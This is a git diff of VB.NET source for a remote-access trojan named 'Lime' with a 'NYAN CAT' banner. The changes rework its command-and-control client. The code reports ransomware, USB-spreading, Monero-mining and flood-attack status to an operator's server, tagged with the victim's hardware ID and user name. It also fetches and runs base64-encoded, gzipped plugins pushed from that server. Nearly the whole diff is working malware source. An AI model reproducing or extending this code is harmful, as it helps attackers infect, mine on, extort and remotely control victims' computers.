@@ -1,9 +1,5 @@
 ﻿'##################################################################
-<<<<<<< HEAD
-'##        N Y A N   C A T  |||   Updated on Nov./27/2018        ##
-=======
-'##        N Y A N   C A T  |||   Updated on Sept/25/2018        ##
->>>>>>> parent of 19710ea... UPDATE v0.1.8.5C
+'##        N Y A N   C A T  |||   Updated on Oct./20/2018        ##
 '##################################################################
 '##                                                              ##
 '##                                                              ##
@@ -40,6 +36,7 @@
 Namespace Lime
 
     Public Class C_Main
+        Public Shared C As New C_TcpClient
         Public Shared SPL = C_Settings.SPL
 
 
@@ -60,7 +57,7 @@ Namespace Lime
                 Dim createdNew As Boolean = False
                 C_Settings.MTX = New Threading.Mutex(True, C_ID.HWID, createdNew)
                 If Not createdNew Then
-                       End
+                    End
                 End If
 
                 If C_Settings.ANTI Then
@@ -108,7 +105,7 @@ Namespace Lime
 #Region "Plugins Loops"
         Declare Sub IdleTimerReset Lib "coredll.dll" Alias "SystemIdleTimerReset" ()
         Private Shared Sub Checking()
-            Threading.Thread.Sleep(5000)
+            Threading.Thread.CurrentThread.Sleep(5000)
 
             Dim OldRans As String = C_ID.Rans
             Dim OldUSB As String = C_ID.USBSP
@@ -119,50 +116,50 @@ Namespace Lime
             While True
 
 1:
-                If C_TcpClient.isConnected = True Then
-                    Threading.Thread.Sleep(3000)
-                    'Compare old string with new string            
+                    If C.Alive = True Then
+                        Threading.Thread.CurrentThread.Sleep(3000)
+                        'Compare old string with new string            
 
-                    Try
+                        Try
                         If OldRans <> GTV("Rans-Status") Then
                             OldRans = GTV("Rans-Status")
-                            C_TcpClient.Send("!R" & SPL & OldRans)
+                            C.Send("!R" & SPL & OldRans + SPL + C_ID.HWID + SPL + C_ID.UserName)
                         End If
                     Catch ex As Exception
 
-                    End Try
+                        End Try
 
-                    Try
-                        If C_Settings.USB Then
-                            If OldUSB <> GTV("USB").ToString Then
-                                OldUSB = GTV("USB")
-                                C_TcpClient.Send("!SP" & SPL & OldUSB)
+                        Try
+                            If C_Settings.USB Then
+                                If OldUSB <> GTV("USB").ToString Then
+                                    OldUSB = GTV("USB")
+                                C.Send("!SP" & SPL & OldUSB + SPL + C_ID.HWID + SPL + C_ID.UserName)
                             End If
-                        End If
-                    Catch ex As Exception
-                    End Try
+                            End If
+                        Catch ex As Exception
+                        End Try
 
-                    Try
+                        Try
                         If OldXMR <> C_ID.XMR Then
                             OldXMR = C_ID.XMR
-                            C_TcpClient.Send("!X" & SPL & OldXMR)
+                            C.Send("!X" & SPL & OldXMR + SPL + C_ID.HWID + SPL + C_ID.UserName)
                         End If
                     Catch ex As Exception
-                    End Try
+                        End Try
 
-                    Try
-                        If OldFLD <> GTV("Flood").ToString Then
-                            OldFLD = GTV("Flood")
-                            C_TcpClient.Send("MSG" & SPL & "Flood! " & OldFLD)
+                        Try
+                            If OldFLD <> GTV("Flood").ToString Then
+                                OldFLD = GTV("Flood")
+                            C.Send("MSG" & SPL & "Flood! " & OldFLD + SPL + C_ID.HWID + SPL + C_ID.UserName)
                             OldFLD = ""
-                            STV("Flood", "")
-                        End If
-                    Catch ex As Exception
-                    End Try
+                                STV("Flood", "")
+                            End If
+                        Catch ex As Exception
+                        End Try
 
-                Else
-                    Threading.Thread.Sleep(5000)
-                End If
+                    Else
+                        Threading.Thread.CurrentThread.Sleep(5000)
+                    End If
 
             End While
 
@@ -172,9 +169,9 @@ Namespace Lime
             Try
                 If GTV("_USB") = Nothing Then
                     While True
-                        If C_TcpClient.isConnected = True Then
-                            Threading.Thread.Sleep(9000)
-                            C_TcpClient.Send("PLUSB")
+                        If C.Alive = True Then
+                            Threading.Thread.CurrentThread.Sleep(9000)
+                            C.Send("PLUSB")
                             Exit While
                         End If
                         Threading.Thread.Sleep(5000)
@@ -183,7 +180,7 @@ Namespace Lime
                     C_Commands.Plugin(GZip(Convert.FromBase64String(GTV("_USB")), False))
                 End If
             Catch ex As Exception
-                C_TcpClient.Send("MSG" + SPL + "_USB Error! " + ex.Message)
+                C.Send("MSG" + SPL + "_USB Error! " + ex.Message)
             End Try
         End Sub
 
@@ -191,9 +188,9 @@ Namespace Lime
             Try
                 If GTV("_PIN") = Nothing Then
                     While True
-                        If C_TcpClient.isConnected = True Then
-                            Threading.Thread.Sleep(11000)
-                            C_TcpClient.Send("PLPIN")
+                        If C.Alive = True Then
+                            Threading.Thread.CurrentThread.Sleep(11000)
+                            C.Send("PLPIN")
                             Exit While
                         End If
                         Threading.Thread.Sleep(5000)
@@ -203,7 +200,7 @@ Namespace Lime
                     C_Commands.Plugin(GZip(Convert.FromBase64String(GTV("_PIN")), False))
                 End If
             Catch ex As Exception
-                C_TcpClient.Send("MSG" + SPL + "_PIN Error! " + ex.Message)
+                C.Send("MSG" + SPL + "_PIN Error! " + ex.Message)
             End Try
         End Sub
 
